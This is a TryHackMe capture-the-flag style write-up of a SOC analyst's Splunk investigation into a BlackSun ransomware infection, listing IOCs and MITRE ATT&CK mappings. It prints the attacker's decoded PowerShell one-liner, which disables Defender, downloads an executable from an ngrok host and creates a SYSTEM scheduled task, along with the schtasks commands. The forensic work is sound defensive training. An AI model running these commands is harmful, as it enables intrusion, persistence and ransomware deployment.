# TryHackMe: PS Eclipse

**Tools Used:** Splunk, CyberChef, VirusTotal  


---

## Scenario

You are a SOC Analyst for an MSSP (Managed Security Service Provider) company called TryNotHackMe.

A customer sent an email asking for an analyst to investigate the events that occurred on Keegan's machine on Monday, May 16th, 2022. The client noted that the machine is operational, but some files have a weird file extension. The client is worried that there was a ransomware attempt on Keegan's device.

Your manager has tasked you to check the events in Splunk to determine what occurred in Keegan's device.

---

## Investigation

### Step 1: Scoping the Search

Started broad with `index=*` and narrowed the time window to the date in question (5/16/2022) using the Date & Time Range picker in Splunk.

```spl
index=*
```

Date range: `5/16/22 12:00:00.000 PM` to `5/16/22 11:59:59.000 PM`

This returned 4,921 events for the day — too broad to work with directly, so the next step was to identify the affected user.

---

### Step 2: Identifying the Affected User

Expanded the `User` field to see who was active on the machine. Out of 5 values, `DESKTOP-TBV8NEF\keegan` stood out as the actual human user account (the rest were SYSTEM/SERVICE accounts).


Filtered the search to Keegan's activity only:

```spl
index=* User="DESKTOP-TBV8NEF\\keegan"
```

This brought the event count down to 927 — much more manageable.

---

### Step 3: Identifying the Malicious Binary

Checked the `EventCode` field breakdown (Sysmon event codes) on the filtered search to see what kind of activity was logged. With EventCode 11 (**FileCreate**) standing out, pivoted to look at what files were being written to disk:

```spl
index=* User="DESKTOP-TBV8NEF\\keegan" EventCode=11
| dedup TargetFilename
| stats count by TargetFilename
```

Most results were Cortana cache noise (`AppData\Local\Packages\Microsoft.Windows.Cortana_...`), but one entry stood out immediately:

```
C:\Windows\Temp\OUTSTANDING_GUTTER.exe
```

A file with that name, dropped directly into `C:\Windows\Temp`, is a major red flag — legitimate Windows binaries don't get named like that, and Temp is a classic staging directory for malware.

**🚩 Suspicious binary identified: `OUTSTANDING_GUTTER.exe`**

---

### Step 4: Finding the Delivery Mechanism

To find out how the binary got there, searched for the process responsible for writing it (Sysmon EventCode 1 — **Process Create**), and located the parent process tied to that FileCreate event.

The raw Sysmon event showed:

```
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -exec bypass -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBs...
```

PowerShell was launched with `-exec bypass` (execution policy bypass) and `-enc` (Base64-encoded command) — both common evasion/obfuscation techniques used to hide the actual payload from casual log review.

**🚩 Delivery executable: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`**

---

### Step 5: Decoding the PowerShell Payload

Took the full Base64 string from the `ParentCommandLine` and decoded it in **CyberChef** using the **From Base64** recipe (with "Remove non-alphabet chars" enabled, since `-enc` PowerShell payloads are UTF-16LE encoded and produce null bytes that need stripping).

**Decoded output:**

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"
```

This single line told the whole story:

1. **Disables Windows Defender real-time monitoring** — `Set-MpPreference -DisableRealtimeMonitoring $true`
2. **Downloads the binary** from an ngrok-tunneled C2 address straight into `C:\Windows\Temp`
3. **Creates a scheduled task** named `OUTSTANDING_GUTTER.exe` that triggers on Application Event ID 777, running as the `SYSTEM` account (privilege escalation)
4. **Immediately runs the scheduled task**, executing the binary with SYSTEM-level permissions

**🚩 Download address:** `hxxp[://]886e-181-215-214-32[.]ngrok[.]io`

**🚩 Privilege escalation command:**
```
"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f
```

**🚩 Run-as / permissions:**
```
NT AUTHORITY\SYSTEM;"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe
```

---

### Step 6: Confirming the Scheduled Task in Raw Logs

Cross-referenced this against the raw Sysmon EventCode 1 log to confirm the scheduled task creation matched the decoded payload exactly:

```
EventCode=1
TaskCategory=Process Create (rule: ProcessCreate)
RuleName: technique_id=T1086,technique_name=PowerShell
Image: C:\Windows\System32\schtasks.exe
OriginalFileName: schtasks.exe
CommandLine: "C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f
User: DESKTOP-TBV8NEF\keegan
```

Confirmed — this matches MITRE ATT&CK technique **T1053 (Scheduled Task/Job)** for persistence and privilege escalation.

---

### Step 7: Identifying C2 Communication

Pivoted to look for DNS query activity (Sysmon EventCode 22) tied to the binary:

```spl
index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" OUTSTANDING EventCode=22
```

This returned 5 events, all pointing to a single `QueryName`:

```
QueryName: 9030-181-215-214-32.ngrok.io
QueryResults: ::ffff:3.134.39.220
Image: C:\Windows\Temp\OUTSTANDING_GUTTER.exe
```

This confirms `OUTSTANDING_GUTTER.exe` itself reached back out over the network to a second ngrok address — separate from the one it was downloaded from — indicating active C2 communication after execution.

**🚩 C2 address:** `hxxp[://]9030-181-215-214-32[.]ngrok[.]io`

---

### Step 8: Finding the Dropped PowerShell Script

Since the binary was staged in `C:\Windows\Temp`, checked for any other files dropped in the same location around the same time, specifically `.ps1` scripts (Sysmon EventCode 11):

```spl
index=* EventCode=11 TargetFilename="C:\\Windows\\Temp\\*.ps1"
| table TargetFilename
```

Results:

```
C:\Windows\Temp\__PSScriptPolicyTest_znwpkv32.osj.ps1
C:\Windows\Temp\__PSScriptPolicyTest_rmlwvvw4.wdu.ps1
C:\Windows\Temp\__PSScriptPolicyTest_3mhxqum0.fcl.ps1
C:\Windows\Temp\__PSScriptPolicyTest_nxbdg4vz.swp.ps1
C:\Windows\Temp\script.ps1
```

The `__PSScriptPolicyTest_*` files are transient artifacts Windows generates when checking script execution policy — not relevant. The one that matters is:

**🚩 PowerShell script dropped: `script.ps1`** (full path: `C:\Windows\Temp\script.ps1`)

---

### Step 9: Identifying the True Nature of the Script

`script.ps1` is a generic, deliberately bland filename — a clear attempt to blend in. Pulled the file hash straight from the raw Sysmon FileCreate event for this file:

```
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\Temp\script.ps1
Hashes: SHA1=E0AFCF804394ABD43AD4723A0FEB147F10E589CD,
MD5=3EBAB71CB71CA5C475202F401DE008C8,
SHA256=E5429F2E44990B3D4E249C566FBF19741E671C0E40B809F87248D9EC9114BEF9
```

Took the SHA256 hash and ran it through **VirusTotal**:

| Result | Value |
|---|---|
| Detections | 31 / 54 security vendors |
| Popular threat label | `ransomware.blacksun/powershell` |
| Threat categories | ransomware, trojan, worm |
| Family labels | blacksun, powershell, psransom |
| File name (per VT) | **BlackSun.ps1** |

The hash match confirms `script.ps1` is the BlackSun ransomware PowerShell script, simply renamed to avoid suspicion on disk.

**🚩 Actual malicious script name: `BlackSun.ps1`**

---

### Step 10: Locating the Ransom Note

With the ransomware family confirmed as BlackSun, searched for `.txt` files created around the same time as evidence of a dropped ransom note:

```spl
index=* EventCode=11 ".txt"
```

This returned 2 events. One was an unrelated Windows Update artifact (`ThirdPartyNotices.txt`); the other was the ransom note itself:

```
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt
CreationUtcTime: 2022-05-16 13:39:30.399
User: NT AUTHORITY\SYSTEM
```

**🚩 Ransom note path:** `C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt`

---

### Step 11: Locating the Wallpaper Change (Additional IOC)

Ransomware families like BlackSun often change the desktop wallpaper as an additional pressure tactic, alongside the ransom note. Searched for `.jpg` file creation events:

```spl
index=* ".jpg"
```

Found:

```
EventCode=11
TaskCategory=File created (rule: FileCreate)
RuleName: technique_id=T1047,technique_name=File System Permissions Weakness
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Public\Pictures\blacksun.jpg
User: NT AUTHORITY\SYSTEM
```

This confirms the script also dropped a wallpaper image to reinforce the ransomware branding on the victim's desktop.

**🚩 Wallpaper IOC path:** `C:\Users\Public\Pictures\blacksun.jpg`

---

## Attack Chain Summary

```
1. Attacker delivers obfuscated PowerShell command (-enc, -exec bypass)
        ↓
2. PowerShell disables Windows Defender real-time monitoring
        ↓
3. PowerShell downloads OUTSTANDING_GUTTER.exe from hxxp[://]886e-181-215-214-32[.]ngrok[.]io
   → saved to C:\Windows\Temp\OUTSTANDING_GUTTER.exe
        ↓
4. Scheduled task created (SYSTEM privileges) to trigger on Event ID 777,
   then immediately run on-demand → privilege escalation + persistence
        ↓
5. OUTSTANDING_GUTTER.exe executes, calls back to
   hxxp[://]9030-181-215-214-32[.]ngrok[.]io (C2)
        ↓
6. script.ps1 (actually BlackSun.ps1 ransomware) dropped to C:\Windows\Temp
        ↓
7. Ransom note dropped: BlackSun_README.txt
   Wallpaper changed: blacksun.jpg
        ↓
8. Files encrypted with unusual extension (matches client report)
```

---

## Indicators of Compromise (IOCs)

| Type | Indicator |
|---|---|
| Malicious binary | `OUTSTANDING_GUTTER.exe` |
| Binary path | `C:\Windows\Temp\OUTSTANDING_GUTTER.exe` |
| Download URL | `hxxp[://]886e-181-215-214-32[.]ngrok[.]io` |
| C2 URL | `hxxp[://]9030-181-215-214-32[.]ngrok[.]io` |
| Resolved C2 IP | `3.134.39.220` |
| Delivery process | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| Malicious script (on disk) | `script.ps1` |
| Malicious script (true identity) | `BlackSun.ps1` |
| Script SHA256 | `E5429F2E44990B3D4E249C566FBF19741E671C0E40B809F87248D9EC9114BEF9` |
| Ransom note | `C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt` |
| Wallpaper artifact | `C:\Users\Public\Pictures\blacksun.jpg` |
| Scheduled task name | `OUTSTANDING_GUTTER.exe` (trigger: Application Event ID 777) |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Execution | PowerShell | T1059.001 |
| Defense Evasion | Disable or Modify Tools (Defender) | T1562.001 |
| Persistence / Privilege Escalation | Scheduled Task/Job | T1053.005 |
| Command and Control | Application Layer Protocol (Web/ngrok tunnel) | T1071.001 |
| Impact | Data Encrypted for Impact (Ransomware) | T1486 |

---

## Key Takeaways

- Base64-encoded (`-enc`) PowerShell commands are a major red flag and should always be decoded during triage — CyberChef's **From Base64** recipe makes this fast.
- Scheduled tasks triggered by obscure Event IDs (like `EventID=777`, which isn't a standard Windows event) are a common LOLBin persistence trick — worth flagging any `schtasks.exe` activity tied to unusual triggers.
- Renaming a malicious script to something bland like `script.ps1` doesn't help once you pull the file hash — VirusTotal lookups on hashes (not just filenames) are essential to unmask true identity.
- ngrok tunnels (`*.ngrok.io`) are frequently abused by attackers for cheap, disposable C2 infrastructure — worth treating as suspicious by default in a corporate environment.
- Ransomware often leaves multiple parallel IOCs beyond just encrypted files: ransom notes, wallpaper changes, and scheduled tasks all serve as pivot points during investigation.

---

*Writeup by Nitisha | #StudentToSOC #BuildInPublic #Unhackd*
